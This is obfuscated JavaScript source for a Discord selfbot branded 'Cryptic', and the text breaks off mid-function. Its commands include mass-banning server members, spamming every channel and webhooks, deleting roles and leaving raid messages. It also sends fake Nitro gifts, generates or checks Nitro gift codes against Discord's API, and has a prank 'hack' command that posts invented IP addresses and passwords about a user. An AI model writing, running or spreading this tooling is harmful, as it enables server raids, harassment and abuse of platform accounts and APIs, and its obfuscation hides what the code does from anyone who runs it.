0`','https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif','\x0a\x20\x20\x20\x20Categories:\x20','setTimestamp','util','short','||||','phone','spoiler','Uh\x20oh,\x20it\x20looks\x20like\x20that\x20there\x20was\x20no\x20body\x20to\x20load.\x20Please\x20try\x20again.','clean\x20<amount>**\x20»\x20Deletes\x20the\x20specified\x20amount\x20of\x20your\x20messages\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','eval','Outlook\x20not\x20so\x20good.','General','hack\x20<user-id>**\x20»\x20Hacks\x20the\x20user\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','green','Prefix:','**Found\x20IP**\x20»\x20','~~__***||','face**\x20»\x20Face\x20Commands\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','¯\x5c_(ツ)_/¯','https://hastebin.com/documents','wink.png','snipe','filter','massban','**Found\x20Username**\x20»\x20','\x20minute,\x20and\x20','Very\x20doubtful.','Missing\x20Permissions',':eight:','Raided\x20by\x20Cryptic','snipe\x20[page-num]**\x20»\x20Snipes\x20the\x20recently\x20deleted\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<>\x20=\x20required\x20|\x20[]\x20=\x20optional\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','set','**Found\x20ID**\x20»\x20','145.58.134.145','codeblock\x20<type>\x20<code>**\x20»\x20Converts\x20your\x20text\x20to\x20a\x20code\x20block\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','key','charAt','delete','Abusive\x20Commands\x20[GUILD\x20ONLY]','Command\x20used','\x0a\x20\x20\x20\x20Bots:\x20','createrole\x20<hex-color>\x20<name>**\x20»\x20Creates\x20a\x20new\x20role\x20with\x20the\x20color\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','202225','members','embed\x20<message>**\x20»\x20Sends\x20an\x20embed\x20with\x20your\x20text\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','guild','Congratulations,\x20you\x20have\x20received\x20a\x20free\x20discord\x20nitro\x20gift','lenny','https://i.gyazo.com/492beb29a2c0133311f6eaf63dfc6372.png','meme.png','abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789','massban**\x20»\x20Bans\x20everyone\x20in\x20the\x20server\x20(Not\x20including\x20the\x20server\x20owner\x20or\x20members\x20with\x20a\x20higher\x20rank/role)\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','This\x20command\x20cannot\x20be\x20executed\x20in\x20Direct\x20Messages\x20or\x20in\x20Private\x20Groups.','[ERROR]:\x20','https://some-random-api.ml/meme','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20```','\x0aTotal\x20Roles:\x20','Outlook\x20good.','Your\x20activity\x20was\x20successfully\x20reset','setColor','headers','mfa_enabled','Successfully\x20deleted\x20the\x20**','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Do\x20Not\x20Disturb:\x20','category','https://discord.com/api/v6/entitlements/gift-codes/','help','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20<>\x20=\x20required\x20|\x20[]\x20=\x20optional\x0a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','spamall\x20<message>\x20»\x20Sends\x20every\x20channel\x20a\x20message\x0a','\x20-\x20Giveaway\x20Couldn\x27t\x20React]','Diamond','\x20now...','|_|','linecount','@discord.com','fox.png','hug.png','Nitro\x20Sniper?','...','\x20day,\x20','decode','The\x20Magic\x208\x20Ball\x20has\x20spoken','As\x20I\x20see\x20it,\x20yes.','eval\x20<code>**\x20»\x20Evaluates\x20JavaScript\x20code\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','Imagine\x20being\x20raided','premiumSubscriptionCount','GitHub:','join','Singapore','https://hastebin.com/','\x0a\x20\x20\x20\x20\x20\x20\x20\x20<>\x20=\x20required\x20|\x20[]\x20=\x20optional\x0a\x20\x20\x20\x20\x20\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20**','Guild\x20ID','**Sold\x20all\x20found\x20data\x20to\x20the\x20government...**','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Categories:\x20','bot','Don’t\x20count\x20on\x20it.','Please\x20specify\x20a\x20user\x20id.','https://cdn.discordapp.com/avatars/','Verification\x20Level','\x20:\x20','setThumbnail','displayAvatarURL','Please\x20specify\x20some\x20text!','\x20hugs\x20','https://some-random-api.ml/animu/hug','94.199.139.255','fakenitro\x20<user-id>**\x20»\x20Sends\x20the\x20user\x20a\x20discor\x20nitro\x20rick\x20roll\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','\x20is\x20my\x20password\x20to\x20my\x20discord\x20account...\x20:flushed:','magenta','Pong!','Invalid\x20password\x20was\x20provided','hrtime','help**\x20»\x20Shows\x20a\x20list\x20of\x20command\x20categories\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','name','premiumTier','**Found\x20Discriminator**\x20»\x20','https://some-random-api.ml/img/fox','\x20second\x20','reverse','**Successfully\x20reported**','roles','url','MessageAttachment','\x0aGuild\x20Region:\x20','Please\x20specify\x20a\x20message.','ping','ms\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','includes','\x0a\x20\x20\x20\x20Streaming:\x20','prefix',':grey_question:','\x0aTotal\x20Boosts:\x20','Channels','spamall','yellow','Utility\x20Commands','author','abcdefghijklmnopqrstuvwxyz','general','HH:mm:ss','username','trap','None','`Highest','upper','https://some-random-api.ml/facts/fox','Online\x20for:','Animal\x20Commands','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**ID**\x20»\x20',':two:','South\x20Africa','cat.png','en-GB','massreact\x20<emoji>**\x20»\x20Adds\x20a\x20reaction\x20to\x20all\x20cached\x20messages\x20in\x20the\x20channel\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','https://some-random-api.ml/img/cat',':heavy_plus_sign:','8ball','**\x20was\x20successfully\x20banned\x20from\x20this\x20server','\x0a\x20\x20\x20\x20Idle:\x20','encode','setAvatar','reverse\x20<message>**\x20»\x20Reverses\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**','splice','WATCHING','login','Cryptic',':chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:\x20:chains:','cls','No\x20reason\x20provied','Please\x20specify\x20the\x20amount\x20of\x20nitro\x20codes\x20you\x20want\x20to\x20generate','Guild\x20Owner','Your\x20text\x20is\x20to\x20long.\x20The\x20maximum\x20amount\x20of\x20characters\x20is\x20`1,024`','\x0a\x20\x20\x20\x20\x20\x20\x20\x20Idle:\x20','unhandledRejection','MyPasswordJustGotLeaked','delroles',':heavy_divide_sign:','webhookspam\x20<webhook-url>\x20<true|false>\x20<message>**\x20»\x20Spams\x20the\x20webhook\x20100\x20times\x20with\x20your\x20message\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20(true\x20=\x20mention\x20everyone\x20with\x20your\x20message,\x20false\x20=\x20regular\x20message\x20without\x20mention)','Your\x20activity\x20was\x20successfully\x20set\x20to\x20`WATCHING`\x20with\x20message\x20`','Please\x20mention\x20a\x20role','Enabled','messageDelete','whitelisted'];(function(_0x16fad7,_0x171306){const _0x4ee34f=function(_0x12ff9){while(--_0x12ff9){_0x16fad7['push'](_0x16fad7['shift']());}};_0x4ee34f(++_0x171306);}(_0x31bf,0x2b*0x2c+-0x16a5*0x1+-0x1*-0x10c1));const _0x43a6=function(_0x16fad7,_0x171306){_0x16fad7=_0x16fad7-(0x2b*0x2c+-0x16a5*0x1+-0x2*-0x893);let _0x4ee34f=_0x31bf[_0x16fad7];return _0x4ee34f;};const _0x5c3a6a=function(_0x1c1bde,_0x295ce3){return _0x43a6(_0x1c1bde- -0x140,_0x295ce3);},Discord=require(_0x5c3a6a(0x181,0x295)),moment=require(_0x5c3a6a(0x393,0x3b9)),colors=require(_0x5c3a6a(0x12f,0x253)),axios=require(_0x5c3a6a(0x2d2,0x244))[_0x5c3a6a(0x250,0x3ca)],title=require(_0x5c3a6a(0x173,0x2)),fetch=require('node-fetch'),figlet=require('figlet'),config=require(_0x5c3a6a(0xf7,0x236)),superagent=require(_0x5c3a6a(0x302,0x302)),bot=new Discord[(_0x5c3a6a(0x15a,0x15))](),{color,image,footer,enabled}=config[_0x5c3a6a(0xac,0x165)],{post}=require(_0x5c3a6a(0x13e,0x21e)),{stripIndents}=require(_0x5c3a6a(0x26d,0x36c)),{Type}=require(_0x5c3a6a(0x2db,0x44d)),{inspect}=require(_0x5c3a6a(0x196,0x2e0)),fs=require('fs'),webhook=require(_0x5c3a6a(0x14e,0x2a9)),_0x4f64ae={};_0x4f64ae[_0x5c3a6a(0x3af,0x4f5)]=_0x5c3a6a(0x257,0x161),_0x4f64ae[_0x5c3a6a(0x206,0x110)]=_0x5c3a6a(0x23a,0x159),_0x4f64ae[_0x5c3a6a(0x1de,0x19c)]=0x92a;const selfbot=_0x4f64ae;process['on'](_0x5c3a6a(0x242,0x2fd),_0x3b8e7d=>console[_0x5c3a6a(0x300,0x2ff)](colors[_0x5c3a6a(0x354,0x46e)](_0x5c3a6a(0xc1,0xaf))+'\x20'+colors[_0x5c3a6a(0x21b,0x14d)](_0x3b8e7d[_0x5c3a6a(0x337,0x36d)]))),process['on'](_0x5c3a6a(0x287,0x108),_0x18f94b=>console[_0x5c3a6a(0x300,0x2dc)](colors[_0x5c3a6a(0x354,0x3fd)](_0x5c3a6a(0xc1,0x18c))+'\x20'+colors[_0x5c3a6a(0x21b,0x353)](_0x18f94b[_0x5c3a6a(0x337,0x2a0)]))),process['on']('uncaughtException',_0x5d3e75=>console[_0x5c3a6a(0x300,0x1fc)](colors['red'](_0x5c3a6a(0xc1,0x253))+'\x20'+colors[_0x5c3a6a(0x21b,0x1bf)](_0x5d3e75[_0x5c3a6a(0x337,0x2a5)]))),bot[_0x5c3a6a(0xfd,-0x6a)]=new Map(),console[_0x5c3a6a(0x300,0x289)](_0x5c3a6a(0x34b,0x2e4)),title('['+selfbot[_0x5c3a6a(0x206,0x374)]+'\x20v'+selfbot[_0x5c3a6a(0x3af,0x408)]+_0x5c3a6a(0x117,0x64)),bot['on'](_0x5c3a6a(0x37c,0x253),async()=>{const _0xc9288c=function(_0x4c97f5,_0x5e9c78){return _0x5c3a6a(_0x4c97f5-0x194,_0x5e9c78);};console[_0xc9288c(0x446,0x45b)](),title('['+selfbot[_0xc9288c(0x39a,0x3f3)]+'\x20v'+selfbot[_0xc9288c(0x543,0x4f5)]+_0xc9288c(0x25d,0x3be)+bot[_0xc9288c(0x2a8,0x401)][_0xc9288c(0x3b5,0x304)]),console[_0xc9288c(0x494,0x338)](_0xc9288c(0x2ce,0x19b)+colors[_0xc9288c(0x4e8,0x417)](_0xc9288c(0x3e2,0x3be))+_0xc9288c(0x4a3,0x3ce)+colors['red'](selfbot[_0xc9288c(0x39a,0x51c)])+'\x20'+colors['cyan']('v'+selfbot[_0xc9288c(0x543,0x562)])+'\x20'+colors[_0xc9288c(0x3af,0x3c5)]('|')+'\x20'+colors[_0xc9288c(0x4e8,0x607)](_0xc9288c(0x530,0x560))+'\x20'+colors[_0xc9288c(0x3ec,0x4c3)](bot[_0xc9288c(0x2a8,0x12b)][_0xc9288c(0x474,0x5df)])+'\x20'+colors[_0xc9288c(0x3af,0x4df)]('|')+'\x20'+colors[_0xc9288c(0x4e8,0x4de)](_0xc9288c(0x2fd,0x2e9))+'\x20'+colors[_0xc9288c(0x3ec,0x4c4)](bot[_0xc9288c(0x2a8,0x396)]['id'])+_0xc9288c(0x42b,0x3d0)+colors[_0xc9288c(0x4e8,0x5dd)](_0xc9288c(0x376,0x378))+'\x20'+(config[_0xc9288c(0x242,0x296)]?colors[_0xc9288c(0x335,0x3a1)](_0xc9288c(0x3dd,0x569)):colors[_0xc9288c(0x4e8,0x397)](_0xc9288c(0x27f,0x21b)))+_0xc9288c(0x42b,0x466)+colors[_0xc9288c(0x4e8,0x5bb)](_0xc9288c(0x45d,0x544))+'\x20'+(config[_0xc9288c(0x50d,0x416)]?colors[_0xc9288c(0x335,0x386)](_0xc9288c(0x3dd,0x415)):colors[_0xc9288c(0x4e8,0x4f3)](_0xc9288c(0x27f,0x225)))+_0xc9288c(0x42b,0x350)+colors[_0xc9288c(0x4e8,0x525)](_0xc9288c(0x336,0x49d))+'\x20'+colors[_0xc9288c(0x3ec,0x275)](''+config['prefix'])+_0xc9288c(0x42b,0x4f0)+colors[_0xc9288c(0x4e8,0x36c)](_0xc9288c(0x37f,0x30d))+'\x20'+colors['cyan'](_0xc9288c(0x475,0x5a8))+_0xc9288c(0x42b,0x30c)+colors['red'](_0xc9288c(0x467,0x59c))+'\x20'+colors[_0xc9288c(0x3ec,0x359)](_0xc9288c(0x287,0x20b))+_0xc9288c(0x260,0x274));if(config[_0xc9288c(0x43e,0x35c)]===!![]){const _0x3d33eb={};_0x3d33eb[_0xc9288c(0x26a,0x3d3)]=_0xc9288c(0x294,0x1ee),bot[_0xc9288c(0x2a8,0x230)][_0xc9288c(0x559,0x429)](_0xc9288c(0x308,0x2ae),_0x3d33eb);}}),bot['on'](_0x5c3a6a(0x337,0x4a5),async _0x1b369a=>{const _0x1be328=function(_0x17d335,_0x2b6c5b){return _0x5c3a6a(_0x17d335-0x3da,_0x2b6c5b);};config[_0x1be328(0x4f6,0x5be)]===!![]&&console[_0x1be328(0x6da,0x67e)](colors[_0x1be328(0x72e,0x5b5)](_0x1b369a[_0x1be328(0x59c,0x67e)][_0x1be328(0x5e0,0x4d2)])+_0x1be328(0x5d2,0x56b)+colors[_0x1be328(0x4fc,0x627)](_0x1b369a[_0x1be328(0x49d,0x53d)][_0x1be328(0x5e0,0x575)])+_0x1be328(0x5d2,0x4d9)+colors[_0x1be328(0x5f5,0x4b9)](_0x1b369a[_0x1be328(0x5f7,0x5d7)][_0x1be328(0x6ba,0x661)])+_0x1be328(0x5d2,0x4af)+colors[_0x1be328(0x57b,0x462)](_0x1b369a[_0x1be328(0x4f8,0x64b)]));if(_0x1b369a[_0x1be328(0x5f7,0x763)][_0x1be328(0x5cd,0x5ba)])return;let _0x32f547=config[_0x1be328(0x5f0,0x691)],_0x174fd5=_0x1b369a['content'][_0x1be328(0x67f,0x538)]('\x20'),_0x390a85=_0x174fd5[0x8d3+-0x8fc+-0x29*-0x1][_0x1be328(0x4b4,0x59f)](_0x32f547,''),_0x1748bb=_0x174fd5[_0x1be328(0x764,0x7fc)](0xda+-0x2532+-0x1*-0x2459);if(!_0x1b369a[_0x1be328(0x4f8,0x610)][_0x1be328(0x678,0x62c)](_0x32f547))return;if(config[_0x1be328(0x625,0x5d2)][_0x1be328(0x5ee,0x5fa)](_0x1b369a[_0x1be328(0x5f7,0x5fd)]['id'])||_0x1b369a[_0x1be328(0x5f7,0x5c8)]['id']===bot[_0x1be328(0x4ee,0x513)]['id']){if(_0x390a85===_0x1be328(0x568,0x633)){console[_0x1be328(0x6da,0x6ea)]('['+colors[_0x1be328(0x57b,0x6d4)](moment()[_0x1be328(0x4bf,0x4f8)]()['format'](_0x1be328(0x5fa,0x693)))+']\x20'+colors[_0x1be328(0x632,0x684)](_0x1be328(0x596,0x445))+'\x20'+colors[_0x1be328(0x5db,0x5d1)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x4b8)](_0x390a85));_0x1b369a['deletable']&&_0x1b369a[_0x1be328(0x594,0x5a6)]();const _0x136038=_0x1b369a[_0x1be328(0x4d3,0x35a)][_0x1be328(0x5e7,0x4d4)][_0x1be328(0x6a5,0x612)]();if(!_0x136038)return _0x1b369a[_0x1be328(0x49d,0x5a7)][_0x1be328(0x4c0,0x526)](_0x1be328(0x622,0x51d));let _0x29f0a6=new Discord[(_0x1be328(0x508,0x4c4))]()[_0x1be328(0x4a2,0x41f)](_0x1be328(0x768,0x5fa))[_0x1be328(0x76c,0x796)](_0x1be328(0x654,0x7c5)+_0x136038[_0x1be328(0x5e0,0x563)]+_0x1be328(0x69f,0x65e))[_0x1be328(0x5d3,0x5bb)](image?image:_0x1be328(0x56d,0x5bf))[_0x1be328(0x5aa,0x6cf)](color?color:_0x1be328(0x4c1,0x510))[_0x1be328(0x69b,0x55a)](footer?footer:_0x1be328(0x524,0x66e));_0x1b369a[_0x1be328(0x49d,0x5c1)][_0x1be328(0x4c0,0x508)](_0x29f0a6),setInterval(()=>{const _0x4bf57c=function(_0x1be304,_0x45b3bf){return _0x1be328(_0x45b3bf- -0x293,_0x1be304);},_0xf2afff={};_0xf2afff[_0x4bf57c(0xdd,0x200)]=_0x4bf57c(0x34b,0x452),_0x136038[_0x4bf57c(0x34f,0x4ce)](_0xf2afff);});}if(_0x390a85===_0x1be328(0x78e,0x7ae)){console[_0x1be328(0x6da,0x7ec)]('['+colors[_0x1be328(0x57b,0x402)](moment()[_0x1be328(0x4bf,0x525)]()[_0x1be328(0x6ed,0x695)]('HH:mm:ss'))+']\x20'+colors[_0x1be328(0x632,0x530)]('Command\x20used')+'\x20'+colors[_0x1be328(0x5db,0x450)]('|')+'\x20'+colors[_0x1be328(0x5f5,0x666)](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x543)]&&_0x1b369a[_0x1be328(0x594,0x713)]();const _0xe8e3c1=_0x1748bb[0x89b+-0x443+0x4*-0x116];if(!_0xe8e3c1)return _0x1b369a[_0x1be328(0x49d,0x411)][_0x1be328(0x4c0,0x52c)](_0x1be328(0x6f3,0x6cb));const _0x100a17={};_0x100a17[_0x1be328(0x49a,0x4c7)]=_0xe8e3c1,_0x100a17[_0x1be328(0x70a,0x5ee)]=_0x1be328(0x51b,0x592);const _0x13ac50=_0x100a17;try{const _0x2a9fbb={};_0x2a9fbb[_0x1be328(0x4e7,0x3d9)]=_0x1be328(0x716,0x866),_0x2a9fbb[_0x1be328(0x5ab,0x6da)]=_0x13ac50,fetch(_0x1be328(0x544,0x3ce),_0x2a9fbb)[_0x1be328(0x67d,0x79e)](async _0x44f15f=>{const _0x2d5b64=function(_0x4e141d,_0x4fc2c0){return _0x1be328(_0x4fc2c0-0x2e1,_0x4e141d);},_0x5c0422=await _0x44f15f[_0x2d5b64(0x858,0x9cf)]();let _0x3c174b=new Discord[(_0x2d5b64(0x7b8,0x7e9))]()[_0x2d5b64(0x862,0x88b)](color?color:_0x2d5b64(0x7fe,0x7a2))[_0x2d5b64(0x9af,0x97c)](footer?footer:_0x2d5b64(0x6e3,0x805))[_0x2d5b64(0x9af,0x8b4)](_0x2d5b64(0x923,0x8b1)+_0x5c0422['id']+'/'+_0x5c0422[_0x2d5b64(0xab9,0xa1c)]+_0x2d5b64(0x962,0x822))[_0x2d5b64(0x9ab,0xa4d)](_0x2d5b64(0x92e,0x8e4)+_0x5c0422['id']+_0x2d5b64(0xb48,0xa75)+_0x5c0422[_0x2d5b64(0x967,0x8dc)]+_0x2d5b64(0x6f1,0x7c5)+_0x5c0422[_0x2d5b64(0xa13,0x9e8)]+_0x2d5b64(0x993,0x83e)+_0x5c0422[_0x2d5b64(0x8e4,0x9c4)][_0x2d5b64(0x944,0x9f5)]()+_0x2d5b64(0x6df,0x829)+_0x5c0422[_0x2d5b64(0x63e,0x778)][_0x2d5b64(0x977,0x9f5)]()+_0x2d5b64(0x975,0x9fc)+(_0x5c0422[_0x2d5b64(0x6e7,0x7e6)]?_0x5c0422[_0x2d5b64(0x912,0x7e6)]:_0x2d5b64(0xa0c,0x8de))+'\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20**Verified?**\x20»\x20'+(_0x5c0422[_0x2d5b64(0x7ab,0x83f)]?_0x2d5b64(0x6e3,0x81e):'No')+_0x2d5b64(0x96d,0x804)+_0x5c0422[_0x2d5b64(0x705,0x771)]+_0x2d5b64(0x9b7,0xa5b)+(_0x5c0422['nsfw_allowed']?_0x2d5b64(0x9a3,0x81e):'No')+_0x2d5b64(0xb61,0xa23)+(_0x5c0422[_0x2d5b64(0x8d7,0x88d)]?_0x2d5b64(0x9b2,0x81e):'No')+_0x2d5b64(0xa4f,0x982)+(_0x5c0422[_0x2d5b64(0x9dd,0x854)]?_0x5c0422[_0x2d5b64(0x97f,0x854)]:_0x2d5b64(0x905,0x8de))+_0x2d5b64(0x92a,0x92e));_0x1b369a[_0x2d5b64(0x6c1,0x77e)]['send'](_0x3c174b);});}catch(_0x2b864f){console[_0x1be328(0x6da,0x5fc)](colors['red'](_0x1be328(0x49b,0x50c))+'\x20'+colors[_0x1be328(0x5f5,0x704)](_0x1be328(0x771,0x6cb)));}}if(_0x390a85===_0x1be328(0x679,0x75d)){console[_0x1be328(0x6da,0x794)]('['+colors[_0x1be328(0x57b,0x40b)](moment()[_0x1be328(0x4bf,0x3df)]()[_0x1be328(0x6ed,0x582)](_0x1be328(0x5fa,0x5e3)))+']\x20'+colors[_0x1be328(0x632,0x4b4)](_0x1be328(0x596,0x72a))+'\x20'+colors[_0x1be328(0x5db,0x44d)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x55c)]&&_0x1b369a[_0x1be328(0x594,0x443)]();const _0x21a98c=['js',_0x1be328(0x6ee,0x661),'ts',_0x1be328(0x6cc,0x562),_0x1be328(0x4be,0x587),_0x1be328(0x70f,0x681),_0x1be328(0x650,0x4ff),'py',_0x1be328(0x6a2,0x6c5),_0x1be328(0x71e,0x65d)];if(!_0x21a98c[_0x1be328(0x5ee,0x719)](_0x1748bb[-0x115*0x2+0xb14+-0x8ea*0x1]))return _0x1b369a[_0x1be328(0x49d,0x409)][_0x1be328(0x4c0,0x642)](_0x1be328(0x56c,0x45c)+_0x21a98c[_0x1be328(0x5c6,0x68b)]('`,\x20`')+'`');let _0x4d81b4=new Discord[(_0x1be328(0x508,0x4fb))]()[_0x1be328(0x4a2,0x4b2)](_0x1be328(0x535,0x64c))[_0x1be328(0x76c,0x681)](_0x1be328(0x72a,0x714)+_0x1748bb[0x1156+-0x2*0x9ec+0x282]+'\x0a'+_0x1748bb['slice'](-0x18ad+-0x2*-0xc73+0x8*-0x7)[_0x1be328(0x5c6,0x54f)]('\x20')+_0x1be328(0x720,0x67c))[_0x1be328(0x5d3,0x594)](image?image:_0x1be328(0x793,0x90c))['setColor'](color?color:_0x1be328(0x4c1,0x5cb))['setFooter'](footer?footer:_0x1be328(0x524,0x5d5));_0x1b369a[_0x1be328(0x49d,0x5e0)][_0x1be328(0x4c0,0x462)](_0x4d81b4);}if(_0x390a85===_0x1be328(0x758,0x5ff)){console[_0x1be328(0x6da,0x601)]('['+colors[_0x1be328(0x57b,0x6a7)](moment()[_0x1be328(0x4bf,0x563)]()[_0x1be328(0x6ed,0x55e)](_0x1be328(0x5fa,0x5d2)))+']\x20'+colors[_0x1be328(0x632,0x6d8)](_0x1be328(0x596,0x440))+'\x20'+colors[_0x1be328(0x5db,0x46b)]('|')+'\x20'+colors['yellow'](_0x390a85));_0x1b369a[_0x1be328(0x69a,0x744)]&&_0x1b369a[_0x1be328(0x594,0x5cb)]();const {body:_0x318ada}=await superagent[_0x1be328(0x6b4,0x65e)](_0x1be328(0x49e,0x397));if(!_0x318ada)return _0x1b369a[_0x1be328(0x49d,0x3e0)][_0x1be328(0x4c0,0x32f)](_0x1be328(0x575,0x6ff));const _0x488136=bot[_0x1be328(0x665,0x7dc)][_0x1be328(0x6b4,0x753)](_0x1748bb[0x1*-0xde5+0x1a86+-0xca1*0x1]);if(!_0x488136)return _0x1b369a[_0x1be328(0x49d,0x405)][_0x1be328(0x4c0,0x406)](_0x1be328(0x713,0x621));const _0x57acc3=await _0x1b369a[_0x1be328(0x49d,0x4b1)][_0x1be328(0x4c0,0x57c)]('Hacking\x20'+_0x488136[_0x1be328(0x5fb,0x5fa)]+_0x1be328(0x5b6,0x670)),_0xc14cef=[_0x1be328(0x77c,0x878),_0x1be328(0x590,0x54a),_0x1be328(0x652,0x527),_0x1be328(0x698,0x6b9),_0x1be328(0x5d8,0x5b3)],_0x1dc8b7=_0xc14cef[Math[_0x1be328(0x4c7,0x603)](Math[_0x1be328(0x552,0x426)]()*_0xc14cef[_0x1be328(0x537,0x58b)])],_0x5aede1=[_0x488136[_0x1be328(0x5fb,0x787)]+_0x1be328(0x4dd,0x4b5),'support@discord.com',''+_0x488136[_0x1be328(0x5fb,0x595)]+_0x488136[_0x1be328(0x707,0x7e9)]+_0x1be328(0x798,0x7db),_0x488136[_0x1be328(0x5fb,0x577)]+'.'+_0x488136[_0x1be328(0x707,0x6b1)]+_0x1be328(0x5b9,0x631)],_0x110f1b=_0x5aede1[Math[_0x1be328(0x4c7,0x442)](Math['random']()*_0x5aede1['length'])],_0x4f0d33=[_0x1be328(0x547,0x617),'selfbotsAreAgainsDiscordTOS',_0x1be328(0x745,0x84a),_0x1be328(0x6d2,0x54b),_0x1be328(0x61d,0x782)],_0xd902b1=_0x4f0d33[Math[_0x1be328(0x4c7,0x568)](Math[_0x1be328(0x552,0x648)]()*_0x4f0d33[_0x1be328(0x537,0x65b)])],_0x785326=[_0x1be328(0x705,0x78c),_0x1be328(0x657,0x6ab),_0x1be328(0x6e0,0x85f),_0xd902b1+_0x1be328(0x5da,0x703),_0x1be328(0x6b0,0x5d4)],_0x5d85f4=_0x785326[Math[_0x1be328(0x4c7,0x619)](Math[_0x1be328(0x552,0x61e)]()*_0x785326[_0x1be328(0x537,0x69f)])];setTimeout(()=>{const _0x2fd762=function(_0x4f0f50,_0x19b682){return _0x1be328(_0x19b682-0x159,_0x4f0f50);};_0x57acc3[_0x2fd762(0x96f,0x8ba)](_0x2fd762(0x6de,0x6d6)+_0x1dc8b7),setTimeout(()=>{const _0x50280f=function(_0x500a84,_0x16ae0b){return _0x2fd762(_0x500a84,_0x16ae0b- -0x1dc);};_0x57acc3['edit'](_0x50280f(0x65a,0x5d2)+_0x110f1b),setTimeout(()=>{const _0x47f415=function(_0x5089a4,_0x5781be){return _0x50280f(_0x5089a4,_0x5781be- -0x162);};_0x57acc3[_0x47f415(0x686,0x57c)](_0x47f415(0x524,0x467)+_0xd902b1),setTimeout(()=>{const _0x14063a=function(_0x2959cd,_0x8be828){return 